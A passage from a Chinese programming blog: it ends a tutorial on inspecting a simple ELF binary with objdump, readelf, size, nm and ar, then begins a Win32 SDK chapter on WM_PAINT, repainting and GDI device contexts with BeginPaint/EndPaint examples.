.....==/...u+UH.</span><br><span class="line"> 10f0 3d022f00 00004889 e5740c48 8b3d1e2f  =./...H..t.H.=./</span><br><span class="line"> 1100 0000e829 ffffffe8 64ffffff c605152f  ...)....d....../</span><br><span class="line"> 1110 0000015d c30f1f00 c30f1f80 00000000  ...]............</span><br><span class="line"> 1120 f30f1efa e977ffff ff554889 e5b80000  .....w...UH.....</span><br><span class="line"> 1130 00005dc3 662e0f1f 84000000 00006690  ..].f.........f.</span><br><span class="line"> 1140 41574c8d 3dcf2c00 00415649 89d64155  AWL.=.,..AVI..AU</span><br><span class="line"> 1150 4989f541 544189fc 55488d2d c02c0000  I..ATA..UH.-.,..</span><br><span class="line"> 1160 534c29fd 4883ec08 e893feff ff48c1fd  SL).H........H..</span><br><span class="line"> 1170 03741b31 db0f1f00 4c89f24c 89ee4489  .t.1....L..L..D.</span><br><span class="line"> 1180 e741ff14 df4883c3 014839dd 75ea4883  .A...H...H9.u.H.</span><br><span class="line"> 1190 c4085b5d 415c415d 415e415f c30f1f00  ..[]A\A]A^A_....</span><br><span class="line"> 11a0 c3                                   .</span><br><span class="line">Contents of section .fini:</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="objdump--d-反汇编包含指令的段">objdump -d
反汇编包含指令的段</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/COFF]</span><br><span class="line">└─# objdump -d main</span><br><span class="line"></span><br><span class="line">main:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .init:</span><br><span class="line"></span><br><span class="line">0000000000001000 &lt;_init&gt;:</span><br><span class="line">    1000:       48 83 ec 08             sub    $0x8,%rsp</span><br><span class="line">    1004:       48 8b 05 dd 2f 00 00    mov    0x2fdd(%rip),%rax        # 3fe8 &lt;__gmon_start__@Base&gt;</span><br><span class="line">    100b:       48 85 c0                test   %rax,%rax</span><br><span class="line">    100e:       74 02                   je     1012 &lt;_init+0x12&gt;</span><br><span class="line">    1010:       ff d0                   call   *%rax</span><br><span class="line">    1012:       48 83 c4 08             add    $0x8,%rsp</span><br><span class="line">    1016:       c3                      ret</span><br><span class="line">....</span><br><span class="line">0000000000001129 &lt;main&gt;:</span><br><span class="line">    1129:       55                      push   %rbp</span><br><span class="line">    112a:       48 89 e5                mov    %rsp,%rbp</span><br><span class="line">    112d:       b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">    1132:       5d                      pop    %rbp</span><br><span class="line">    1133:       c3                      ret</span><br><span class="line">    1134:       66 2e 0f 1f 84 00 00    cs nopw 0x0(%rax,%rax,1)</span><br><span class="line">    113b:       00 00 00</span><br><span class="line">    113e:       66 90                   xchg   %ax,%ax</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="objdump--r-观察重定位表">objdump -r 观察重定位表</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/COFF]</span><br><span class="line">└─# objdump -r test.o</span><br><span class="line"></span><br><span class="line">test.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">RELOCATION RECORDS FOR [.text]:</span><br><span class="line">OFFSET           TYPE              VALUE</span><br><span class="line">0000000000000007 R_X86_64_PC32     .rodata-0x0000000000000004</span><br><span class="line">000000000000000f R_X86_64_PLT32    puts-0x0000000000000004</span><br><span class="line">000000000000001e R_X86_64_PLT32    add-0x0000000000000004</span><br><span class="line">0000000000000027 R_X86_64_PC32     .rodata+0x0000000000000006</span><br><span class="line">0000000000000034 R_X86_64_PLT32    printf-0x0000000000000004</span><br><span class="line">000000000000003a R_X86_64_PC32     value-0x0000000000000004</span><br><span class="line">0000000000000043 R_X86_64_PC32     .rodata+0x000000000000000e</span><br><span class="line">0000000000000050 R_X86_64_PLT32    printf-0x0000000000000004</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RELOCATION RECORDS FOR [.eh_frame]:</span><br><span class="line">OFFSET           TYPE              VALUE</span><br><span class="line">0000000000000020 R_X86_64_PC32     .text</span><br></pre></td></tr></table></figure>
<h4 id="size观察代码数据段的长度">size观察代码数据段的长度</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/<span class="number">86135</span>/desktop/COFF]</span><br><span class="line">└─<span class="meta"># size main</span></span><br><span class="line">   text    data     bss     dec     hex filename</span><br><span class="line">   <span class="number">1406</span>     <span class="number">528</span>       <span class="number">8</span>    <span class="number">1942</span>     <span class="number">796</span> main</span><br><span class="line">   ;text代码段长度(<span class="number">10</span>进制)	data数据段长度(<span class="number">10</span>进制)	bss未初始化数据段(<span class="number">10</span>进制) dec这三个段长度和(<span class="number">10</span>进制) hex这三个段的长度和(<span class="number">16</span>进制)</span><br></pre></td></tr></table></figure>
<h4 id="readelf观察elf格式">readelf观察ELF格式</h4>
<h5 id="readelf--h观察elf头">readelf -h观察ELF头</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/COFF]</span><br><span class="line">└─# readelf -h main</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00</span><br><span class="line">  Class:                             ELF64</span><br><span class="line">  Data:                              2&#x27;s complement, little endian</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI Version:                       0</span><br><span class="line">  Type:                              DYN (Position-Independent Executable file)</span><br><span class="line">  Machine:                           Advanced Micro Devices X86-64</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x1040</span><br><span class="line">  Start of program headers:          64 (bytes into file)</span><br><span class="line">  Start of section headers:          14080 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               64 (bytes)</span><br><span class="line">  Size of program headers:           56 (bytes)</span><br><span class="line">  Number of program headers:         13</span><br><span class="line">  Size of section headers:           64 (bytes)</span><br><span class="line">  Number of section headers:         30</span><br><span class="line">  Section header string table index: 29</span><br></pre></td></tr></table></figure>
<h5 id="readelf--s观察各节区">readelf -S观察各节区</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/COFF]</span><br><span class="line">└─# readelf -S main</span><br><span class="line">There are 30 section headers, starting at offset 0x3700:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ 0]                   NULL             0000000000000000  00000000</span><br><span class="line">       0000000000000000  0000000000000000           0     0     0</span><br><span class="line">  [ 1] .interp           PROGBITS         0000000000000318  00000318</span><br><span class="line">       000000000000001c  0000000000000000   A       0     0     1</span><br><span class="line">  [ 2] .note.gnu.pr[...] NOTE             0000000000000338  00000338</span><br><span class="line">       0000000000000020  0000000000000000   A       0     0     8</span><br><span class="line">  [ 3] .note.gnu.bu[...] NOTE             0000000000000358  00000358</span><br><span class="line">       0000000000000024  0000000000000000   A       0     0     4</span><br><span class="line">  [ 4] .note.ABI-tag     NOTE             000000000000037c  0000037c</span><br><span class="line">       0000000000000020  0000000000000000   A       0     0     4</span><br><span class="line">  [ 5] .gnu.hash         GNU_HASH         00000000000003a0  000003a0</span><br><span class="line">       0000000000000024  0000000000000000   A       6     0     8</span><br><span class="line">  [ 6] .dynsym           DYNSYM           00000000000003c8  000003c8</span><br><span class="line">       0000000000000090  0000000000000018   A       7     1     8</span><br><span class="line">  [ 7] .dynstr           STRTAB           0000000000000458  00000458</span><br><span class="line">       000000000000007d  0000000000000000   A       0     0     1</span><br><span class="line">  [ 8] .gnu.version      VERSYM           00000000000004d6  000004d6</span><br><span class="line">       000000000000000c  0000000000000002   A       6     0     2</span><br><span class="line">  [ 9] .gnu.version_r    VERNEED          00000000000004e8  000004e8</span><br><span class="line">       0000000000000020  0000000000000000   A       7     1     8</span><br><span class="line">  [10] .rela.dyn         RELA             0000000000000508  00000508</span><br><span class="line">       00000000000000c0  0000000000000018   A       6     0     8</span><br><span class="line">  [11] .init             PROGBITS         0000000000001000  00001000</span><br><span class="line">       0000000000000017  0000000000000000  AX       0     0     4</span><br><span class="line">  [12] .plt              PROGBITS         0000000000001020  00001020</span><br><span class="line">       0000000000000010  0000000000000010  AX       0     0     16</span><br><span class="line">  [13] .plt.got          PROGBITS         0000000000001030  00001030</span><br><span class="line">       0000000000000008  0000000000000008  AX       0     0     8</span><br><span class="line">  [14] .text             PROGBITS         0000000000001040  00001040</span><br><span class="line">       0000000000000161  0000000000000000  AX       0     0     16</span><br><span class="line">  [15] .fini             PROGBITS         00000000000011a4  000011a4</span><br><span class="line">       0000000000000009  0000000000000000  AX       0     0     4</span><br><span class="line">  [16] .rodata           PROGBITS         0000000000002000  00002000</span><br><span class="line">       0000000000000004  0000000000000004  AM       0     0     4</span><br><span class="line">  [17] .eh_frame_hdr     PROGBITS         0000000000002004  00002004</span><br><span class="line">       000000000000003c  0000000000000000   A       0     0     4</span><br><span class="line">  [18] .eh_frame         PROGBITS         0000000000002040  00002040</span><br><span class="line">       0000000000000108  0000000000000000   A       0     0     8</span><br><span class="line">  [19] .init_array       INIT_ARRAY       0000000000003e18  00002e18</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [20] .fini_array       FINI_ARRAY       0000000000003e20  00002e20</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [21] .dynamic          DYNAMIC          0000000000003e28  00002e28</span><br><span class="line">       00000000000001b0  0000000000000010  WA       7     0     8</span><br><span class="line">  [22] .got              PROGBITS         0000000000003fd8  00002fd8</span><br><span class="line">       0000000000000028  0000000000000008  WA       0     0     8</span><br><span class="line">  [23] .got.plt          PROGBITS         0000000000004000  00003000</span><br><span class="line">       0000000000000018  0000000000000008  WA       0     0     8</span><br><span class="line">  [24] .data             PROGBITS         0000000000004018  00003018</span><br><span class="line">       0000000000000010  0000000000000000  WA       0     0     8</span><br><span class="line">  [25] .bss              NOBITS           0000000000004028  00003028</span><br><span class="line">       0000000000000008  0000000000000000  WA       0     0     1</span><br><span class="line">  [26] .comment          PROGBITS         0000000000000000  00003028</span><br><span class="line">       000000000000001e  0000000000000001  MS       0     0     1</span><br><span class="line">  [27] .symtab           SYMTAB           0000000000000000  00003048</span><br><span class="line">       00000000000003a8  0000000000000018          28    21     8</span><br><span class="line">  [28] .strtab           STRTAB           0000000000000000  000033f0</span><br><span class="line">       00000000000001fd  0000000000000000           0     0     1</span><br><span class="line">  [29] .shstrtab         STRTAB           0000000000000000  000035ed</span><br><span class="line">       0000000000000110  0000000000000000           0     0     1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  D (mbind), l (large), p (processor specific)</span><br></pre></td></tr></table></figure>
<p>Nr:下标</p>
<p>Name:节名字符串在<code>.shstrtab</code>字符串表中的偏移量</p>
<p>Type:节类型</p>
<p>Address:节虚拟地址</p>
<p>Offset:节文件偏移</p>
<p>Size:节大小</p>
<p>EntSize:节项目(如果节是一个表的话)大小</p>
<p>Flags:节属性</p>
<p>Link&amp;Info:节链接信息</p>
<p>Align:节对齐要求</p>
<h5 id="readelf--s观察符号">readelf -s观察符号</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/COFF]</span><br><span class="line">└─# readelf -s test.o</span><br><span class="line"></span><br><span class="line">Symbol table &#x27;.symtab&#x27; contains 12 entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS test.c</span><br><span class="line">     2: 0000000000000000     0 SECTION LOCAL  DEFAULT    1 .text</span><br><span class="line">     3: 0000000000000000     0 SECTION LOCAL  DEFAULT    3 .data</span><br><span class="line">     4: 0000000000000000     0 SECTION LOCAL  DEFAULT    4 .bss</span><br><span class="line">     5: 0000000000000004     4 OBJECT  LOCAL  DEFAULT    3 static_initialized</span><br><span class="line">     6: 0000000000000004     4 OBJECT  LOCAL  DEFAULT    4 static_uninitialized</span><br><span class="line">     7: 0000000000000000     0 SECTION LOCAL  DEFAULT    5 .rodata</span><br><span class="line">     8: 0000000000000000     4 OBJECT  GLOBAL DEFAULT    3 global_initialized</span><br><span class="line">     9: 0000000000000000     4 OBJECT  GLOBAL DEFAULT    4 global_uninitialized</span><br><span class="line">    10: 0000000000000000    70 FUNC    GLOBAL DEFAULT    1 main</span><br><span class="line">    11: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND printf</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>栏目</th>
<th>意义</th>
</tr>
</thead>
<tbody>
<tr>
<td>Num</td>
<td>符号表数组中的下标</td>
</tr>
<tr>
<td>Value</td>
<td>st_value符号值</td>
</tr>
<tr>
<td>Size</td>
<td>st_size符号大小</td>
</tr>
<tr>
<td>Type</td>
<td>st_info低四位符号类型</td>
</tr>
<tr>
<td>Bind</td>
<td>st_info高四位符号绑定信息</td>
</tr>
<tr>
<td>Vis</td>
<td>st_other尚未使用,都是DEFAULT</td>
</tr>
<tr>
<td>Ndx</td>
<td>st_shndx</td>
</tr>
<tr>
<td>Name</td>
<td>符号名称</td>
</tr>
</tbody>
</table>
<h4 id="nm观察符号表">nm观察符号表</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/COFF]</span><br><span class="line">└─# nm -a test.o</span><br><span class="line">0000000000000000 b .bss</span><br><span class="line">0000000000000000 d .data</span><br><span class="line">0000000000000000 D global_initialized</span><br><span class="line">0000000000000000 B global_uninitialized</span><br><span class="line">0000000000000000 T main</span><br><span class="line">                 U printf</span><br><span class="line">0000000000000000 r .rodata</span><br><span class="line">0000000000000004 d static_initialized</span><br><span class="line">0000000000000004 b static_uninitialized</span><br><span class="line">0000000000000000 a test.c</span><br><span class="line">0000000000000000 t .text</span><br></pre></td></tr></table></figure>
<h4 id="ar处理静态库">ar处理静态库</h4>
<h5 id="ar--t查看归档文件包括的目标模块">ar
-t查看归档文件包括的目标模块</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/COFF]</span><br><span class="line">└─# ar -t /usr/lib32/libc.a</span><br><span class="line">init-first.o</span><br><span class="line">libc-start.o</span><br><span class="line">sysdep.o</span><br><span class="line">version.o</span><br><span class="line">check_fds.o</span><br><span class="line">libc-tls.o</span><br><span class="line">elf-init.o</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="ar--x将归档文件解包释放所有.o目标模块">ar
-x将归档文件解包,释放所有.o目标模块</h5>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/08/08/win32%20chapter4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/08/win32%20chapter4/" class="post-title-link" itemprop="url">win32程序设计-chapter4 设备无关代码</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-08-08 00:38:00 / Modified: 14:45:36" itemprop="dateCreated datePublished" datetime="2022-08-08T00:38:00+08:00">2022-08-08</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="windows-sdk-chapter-4-设备无关代码">windows SDK chapter 4
设备无关代码</h1>
<h2 id="绘制和重绘">绘制和重绘</h2>
<p>为什么需要重绘?</p>
<blockquote>
<p>在控制台编程时,输出均以纯文本打印到终端,终端会永远保存输出,自然不需要重绘</p>
<p>但是窗口编程的时候,一个窗口可能被移动到屏幕边界之外或者被其他窗口遮盖,此时这个窗口上的文字就消失了,</p>
<p>系统不会<strong>一直记着</strong>(操作系统有可能临时记住)窗口上画过什么,在哪里画的.当用户再次将这个窗口置于顶层的时候,操作系统就要求程序,将刚才抹去的文字重新打印.这个过程当然也是在消息循环中处理的.</p>
</blockquote>
<p>操作系统怎么发出重绘的要求呢?</p>
<blockquote>
<p>使用WM_PAINT消息</p>
</blockquote>
<h3 id="wm_paint">WM_PAINT</h3>
<p>操作系统什么时候会发出这个WM_PAINT要求呢?</p>
<blockquote>
<p>用户移动窗口,导致原来被遮盖的部分暴露,或者关闭了覆盖该窗口的对话框</p>
<p>用户调整窗口大小</p>
<p>滚动条滚动</p>
<p>程序自己显式调用InvalidateRect或者InvalidateRgn,生成WM_PAINT消息</p>
<p>下拉菜单后收回</p>
<p>只要是程序需要更新客户区的时候,应该自动或者强制发出WM_PAINT消息,绕一个弯集中从事件函数中处理</p>
</blockquote>
<p>操作系统不能记住被覆盖的部分吗?</p>
<blockquote>
<p>少数情况下可以,比如鼠标指针造成的小面积覆盖或者在客户区内拖动图表</p>
</blockquote>
<h3 id="有效矩形和无效矩形">有效矩形和无效矩形</h3>
<p>需要重新绘制的部分成为无效矩形</p>
<p>什么部分需要重新绘制?先前被遮盖现在需要至于顶层的窗口部分,或者先前移出屏幕现在移入屏幕的部分</p>
<p>windows操作系统会为每个打开的窗口维护一个数据结构,该数据结构用来记录该窗口的最小无效区域范围,如果在该窗口重绘之前,在其上又有新的无效矩形则windows取所有无效区域的最小覆盖.如果原来该窗口进程的消息队列中没有有WM_PAINT消息,则发送一条该消息.如果已经有过WM_PAINT则只需要更新操作系统维护的数据结构</p>
<p>什么数据结构?目前未知,需要学习核心编程后获得原理</p>
<h3 id="立刻重绘">立刻重绘</h3>
<p>各种WM消息是有优先级之分的</p>
<p>WM_PAINT重绘消息的优先级就比较低,WM_VSCROLL垂直滚动条消息就比较高</p>
<p>即使消息队列中已经存在了WM_PAINT消息,后来加入一个WM_VSCROLL消息,这个WM_VSCROLL消息也会先被处理.如此优先队列有个好处是,WM_PAINT消息只会存在一条,多次改变之后重绘和每次改变后的重绘,对于人类来说几乎观察不出来,因此WM_PAINT不需要太多</p>
<p>这就有可能导致,程序一直在忙活高优先级的消息处理,WM_PAINT这个消息一直不处理,比如一个有上亿行的数据库,不停拖动滚动条改变垂直视角的时候程序可能一直忙于处理WM_VSCROLL.那么我们看到的窗口就会迟滞.</p>
<p>但是有那种关系户性质的WM_PAINT消息,它不用排队等待被处理,而是被操作系统亲自安排给程序"给我立刻处理WM_PAINT"</p>
<p>调用UpdateWindow(hwnd)函数即可做到这一点</p>
<p>如果调用UpdateWindow函数时,整个客户区都是有效的,那么调用了一个寂寞</p>
<p>否则,即客户区存在无效矩形,UpdateWindow让窗口立刻收到WM_PAINT,由windows操作系统调用窗口过程WndProc函数</p>
<p>当WM_PAINT处理完后,UpdateWindow将控制还给调用者</p>
<p>这就解释了为啥在主函数创建窗口实例,ShowWindow之后,进入消息循环之前,有一次UpdateWindow</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ShowWindow(hwnd, iCmdShow);</span><br><span class="line">UpdateWindow(hwnd);</span><br></pre></td></tr></table></figure>
<p>即使这里不写UpdateWindow(hwnd),通常也能立刻显式窗口.但是就怕WM_PAINT一直排队的情况</p>
<h2 id="gdi">GDI</h2>
<p>graphics device
interface,图形设备接口,负责系统与绘图程序的信息交换</p>
<blockquote>
<p>图形设备,如打印机,屏幕</p>
</blockquote>
<p>GDI负责封装硬件设备,并且向上层提供接口,在代码层面如果需要和图形设备交互,只需要调用接口.</p>
<p>类似于系统调用接口,GDI也允许程序直接访问物理硬件,只能通过"设备环境"抽象接口访问硬件</p>
<blockquote>
<p>举一个GDI的例子</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WINGDIAPI WINBOOL WINAPI <span class="title function_">TextOutA</span><span class="params">(HDC hdc,<span class="type">int</span> x,<span class="type">int</span> y,LPCSTR lpString,<span class="type">int</span> c)</span>;</span><br><span class="line">WINGDIAPI WINBOOL WINAPI <span class="title function_">TextOutW</span><span class="params">(HDC hdc,<span class="type">int</span> x,<span class="type">int</span> y,LPCWSTR lpString,<span class="type">int</span> c)</span>;</span><br></pre></td></tr></table></figure>
<p><code>TextOut</code>函数的作用是向窗口客户区输出一个字符串,</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>意义</th>
</tr>
</thead>
<tbody>
<tr>
<td>hdc</td>
<td>设备环境句柄,几乎所有的GDI函数都以hdc作为第一个参数</td>
</tr>
<tr>
<td>x</td>
<td>开始绘制的客户区相对横坐标</td>
</tr>
<tr>
<td>y</td>
<td>--纵坐标</td>
</tr>
<tr>
<td>lpString</td>
<td>需要输出到客户区的字符串</td>
</tr>
<tr>
<td>c</td>
<td>lpString的长度</td>
</tr>
</tbody>
</table>
</blockquote>
<h3 id="设备环境">设备环境</h3>
<p>设备环境DC是内核维护的数据结构</p>
<p>一个设备环境与一个特定你的显式设备相关联</p>
<p>设备环境的属性包括文本颜色,文本背景色,字体等等</p>
<p>GDI函数可以根据相对于设备环境分成两类,一类是使用HDC真正绘图的函数,另一类是修改HDC的函数</p>
<blockquote>
<p>如果以在纸上画画类比的话,</p>
<p>设备环境就相当于图纸,画笔,图纸下面的桌子,灯光,以及谁来画(决定字体)</p>
<p>真正输出的内容相当于这个特定的人主观画出的东西</p>
</blockquote>
<p>设备环境是一个大结构体,怎么引用他呢?使用指针?不是,使用HDC类型的句柄.</p>
<p>实际上这个句柄也是一个整数,可能是内核维护的设备环境表的下标,反正一个设备环境对应唯一的一个编号,作为句柄索引该设备环境</p>
<h3 id="获取设备环境句柄">获取设备环境句柄</h3>
<h4 id="beginpaintendpaint">BeginPaint/EndPaint</h4>
<p>这一对只应用于处理WM_PAINT消息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">  PAINTSTRUCT ps;</span><br><span class="line">  RECT rect;</span><br><span class="line">  HDC hdc;</span><br><span class="line">  <span class="type">static</span> TCHAR szBuffer[<span class="number">128</span>] = TEXT(<span class="string">&quot;default&quot;</span>);</span><br><span class="line">  <span class="keyword">switch</span> (message)</span><br><span class="line">  &#123;</span><br><span class="line">...</span><br><span class="line">  <span class="keyword">case</span> WM_PAINT:</span><br><span class="line">      hdc = BeginPaint(hwnd, &amp;ps);<span class="comment">//获取设备环境hdc,并且第二个参数ps中也有相同的hdc</span></span><br><span class="line">      GetClientRect(hwnd, &amp;rect);<span class="comment">//获取当前客户区矩形范围,通过第二个参数返回</span></span><br><span class="line">      DrawText(hdc, szBuffer, <span class="number">-1</span>, &amp;rect, DT_SINGLELINE | DT_CENTER | DT_VCENTER);</span><br><span class="line">          <span class="comment">//使用hdc设备环境,向rect矩形范围内绘制一个单行上下左右都居中的字符串&quot;default&quot;</span></span><br><span class="line">      EndPaint(hwnd, &amp;ps);<span class="comment">//释放ps中保存的hdc(也就是BeginPaint创建的hdc)</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      ...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HDC BeginPaint(</span><br><span class="line">  [in]  HWND          hWnd,		//窗口实例句柄</span><br><span class="line">  [out] LPPAINTSTRUCT lpPaint	//</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">BOOL EndPaint(</span><br><span class="line">  [in] HWND              hWnd,</span><br><span class="line">  [in] const LPPAINTSTRUCT lpPaint</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>两个函数的第一个参数均为HWND窗口句柄</p>
<blockquote>
<p>hwnd是啥?</p>
